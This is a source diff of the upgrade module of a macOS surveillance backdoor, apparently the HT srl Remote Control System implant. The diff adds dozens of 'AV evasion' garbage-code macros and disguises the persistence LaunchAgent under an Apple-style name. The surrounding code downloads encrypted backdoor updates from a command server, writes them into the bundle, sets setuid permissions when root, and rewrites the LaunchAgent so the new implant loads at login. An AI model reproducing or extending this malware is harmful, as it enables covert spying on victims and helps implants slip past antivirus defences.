@@ -7,13 +7,13 @@
  *  Copyright (C) HT srl 2011. All rights reserved
  *
  */
+#import "RCSMCommon.h"
 
 #import "UpgradeNetworkOperation.h"
 #import "NSMutableData+AES128.h"
 #import "NSString+SHA1.h"
 #import "NSData+SHA1.h"
 #import "NSData+Pascal.h"
-#import "RCSMCommon.h"
 
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
@@ -22,6 +22,7 @@
 #define DYLIB_UPGRADE @"inputmanager"
 #define KEXT_UPGRADE  @"driver"
 
+#import "RCSMAVGarbage.h"
 
 @interface UpgradeNetworkOperation (private)
 
@@ -36,34 +37,57 @@
   BOOL success = NO;
   u_long permissions;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   // FIXED-
   if (getuid() == 0 || geteuid() == 0)
     permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
   else
     permissions  = (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
   NSValue *owner      = [NSNumber numberWithInt: 0];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                   permission,
                                   NSFilePosixPermissions,
-                                  owner,
-                                  NSFileOwnerAccountID,
+//                                  owner,
+//                                  NSFileOwnerAccountID,
                                   nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  NSError *err;
   
   success = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                              ofItemAtPath: upgradePath
-                                                    error: nil];
+                                                    error: &err];
+  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (success == NO)
-      return success;  
-      
+  {
+    return success;  
+  }
+ 
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   // Once the backdoor has been written, edit the backdoor Loader in order to
   // load the new updated backdoor upon reboot/login
-  NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
-                                   NSHomeDirectory(),
-                                   BACKDOOR_DAEMON_PLIST];
+  NSString *backdoorLaunchAgent = createLaunchdPlistPath();
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   NSError *error = nil;
   if ([[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
@@ -74,10 +98,19 @@
 #endif
     }
   
-  [backdoorLaunchAgent release];
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
-  success = [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
+  NSString *backdoorDaemonName = [NSString stringWithFormat:@"%@.%@.%@", 
+                                  DOMAIN_COM, 
+                                  DOMAIN_APL, 
+                                  LAUNCHD_NAME];
+  
+  success = [gUtil createLaunchAgentPlist: backdoorDaemonName
                                 forBinary: gBackdoorUpdateName];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   if (success == NO)
     {
@@ -91,6 +124,9 @@
       infoLog(@"LaunchAgent file updated");
 #endif
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   return YES;
 }
@@ -106,9 +142,9 @@
     {
       mTransport = aTransport;
       
-#ifdef DEBUG_UPGRADE_NOP
-      infoLog(@"mTransport: %@", mTransport);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       return self;
     }
   
@@ -122,23 +158,35 @@
 
 - (BOOL)perform
 {
-#ifdef DEBUG_UPGRADE_NOP
-  infoLog(@"");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   uint32_t command              = PROTO_UPGRADE;
   NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
   NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                 length: sizeof(uint32_t)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSData *commandSha            = [commandData sha1Hash];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [commandData appendData: commandSha];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
 #ifdef DEBUG_UPGRADE_NOP
   infoLog(@"commandData: %@", commandData);
 #endif
   
   [commandData encryptWithKey: gSessionKey];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   //
   // Send encrypted message
@@ -147,32 +195,50 @@
   NSData *replyData             = nil;
   NSMutableData *replyDecrypted = nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   replyData = [mTransport sendData: commandData
                  returningResponse: urlResponse];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (replyData == nil)
     {
-#ifdef DEBUG_UPGRADE_NOP
-      errorLog(@"empty reply from server");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_006
+     
       [commandData release];
       [outerPool release];
       
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [replyDecrypted decryptWithKey: gSessionKey];
   
-#ifdef DEBUG_UPGRADE_NOP
-  infoLog(@"replyDecrypted: %@", replyDecrypted);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [replyDecrypted getBytes: &command
                     length: sizeof(uint32_t)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   // remove padding
   [replyDecrypted removePadding];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   //
   // check integrity
@@ -182,40 +248,65 @@
   
   @try
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       shaRemote = [replyDecrypted subdataWithRange:
                    NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                                CC_SHA1_DIGEST_LENGTH)];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       shaLocal = [replyDecrypted subdataWithRange:
                   NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
     }
   @catch (NSException *e)
-    {    
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   shaLocal = [shaLocal sha1Hash];
   
-#ifdef DEBUG_UPGRADE_NOP
-  infoLog(@"shaRemote: %@", shaRemote);
-  infoLog(@"shaLocal : %@", shaLocal);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {     
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       return NO;
     }
   
   if (command != PROTO_OK)
-    {     
+    {    
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
@@ -228,56 +319,101 @@
   uint32_t filenameSize   = 0;
   uint32_t fileSize       = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   @try
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+     
       [replyDecrypted getBytes: &packetSize
                          range: NSMakeRange(4, sizeof(uint32_t))];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       [replyDecrypted getBytes: &numOfFilesLeft
                          range: NSMakeRange(8, sizeof(uint32_t))];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+  
       [replyDecrypted getBytes: &filenameSize
                          range: NSMakeRange(12, sizeof(uint32_t))];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       [replyDecrypted getBytes: &fileSize
                          range: NSMakeRange(16 + filenameSize, sizeof(uint32_t))];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
     }
   @catch (NSException *e)
     {
-      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       return NO;
     }
   
-#ifdef DEBUG_UPGRADE_NOP
-  infoLog(@"packetSize    : %d", packetSize);
-  infoLog(@"numOfFilesLeft: %d", numOfFilesLeft);
-  infoLog(@"filenameSize  : %d", filenameSize);
-  infoLog(@"fileSize      : %d", fileSize);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSData *stringData;
   NSData *fileContent;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   @try
-    {
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       stringData  = [[NSData alloc] initWithData:
                      [replyDecrypted subdataWithRange: NSMakeRange(12, filenameSize + 4)]];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       fileContent = [[NSData alloc] initWithData:
                      [replyDecrypted subdataWithRange: NSMakeRange(16 + filenameSize + 4, fileSize)]];
     }
   @catch (NSException *e)
-    {    
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       return NO;
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSString *filename  = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
-
-#define XPC_UPGRADE @"xpc" 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
+//#define XPC_UPGRADE @"xpc" 
 
   if (filename == nil)
     {
@@ -287,12 +423,21 @@
     }
   else
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
       if ([filename isEqualToString: CORE_UPGRADE])
         {
+          // AV evasion: only on release build
+          AV_GARBAGE_001
+          
           NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     gBackdoorUpdateName];
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
           [fileContent writeToFile: _upgradePath
                         atomically: YES];
           
@@ -303,37 +448,42 @@
 #endif
             }
           
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
           [_upgradePath release];
         }
       else if ([filename isEqualToString: DYLIB_UPGRADE])
         {
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
           // FIXED-
           NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     RCS8_UPDATE_DYLIB];
-           
-          [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
-                                                     error: nil];
-          // And write it back
-          [fileContent writeToFile: _upgradePath
-                        atomically: YES];
-                        
-          [_upgradePath release];
-        }
-      else if ([filename isEqualToString: XPC_UPGRADE])
-        {
-          // FIXED-
-          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
-                                    [[NSBundle mainBundle] bundlePath],
-                                    RCS8_UPDATE_XPC];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
           
           [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
                                                      error: nil];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_000
+          
           // And write it back
           [fileContent writeToFile: _upgradePath
                         atomically: YES];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           [_upgradePath release];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
+          
         }
       else if ([filename isEqualToString: KEXT_UPGRADE])
         {          
@@ -345,21 +495,65 @@
           errorLog(@"Upgrade not supported (%@)", filename);
 #endif
         }
+//      else if ([filename isEqualToString: XPC_UPGRADE])
+//      {
+//        // AV evasion: only on release build
+//        AV_GARBAGE_007
+//        
+//        // FIXED-
+//        NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
+//                                  [[NSBundle mainBundle] bundlePath],
+//                                  RCS8_UPDATE_XPC];
+//        
+//        // AV evasion: only on release build
+//        AV_GARBAGE_008
+//        
+//        [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
+//                                                   error: nil];
+//        
+//        // AV evasion: only on release build
+//        AV_GARBAGE_009
+//        
+//        // And write it back
+//        [fileContent writeToFile: _upgradePath
+//                      atomically: YES];
+//        
+//        // AV evasion: only on release build
+//        AV_GARBAGE_000
+//        
+//        [_upgradePath release];
+//      }
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [fileContent release];
   [stringData release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [replyDecrypted release];
   [commandData release];
   [outerPool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   //
   // Get files until there's no one left
   //
   if (numOfFilesLeft != 0)
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       return [self perform];
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   return YES;
 }
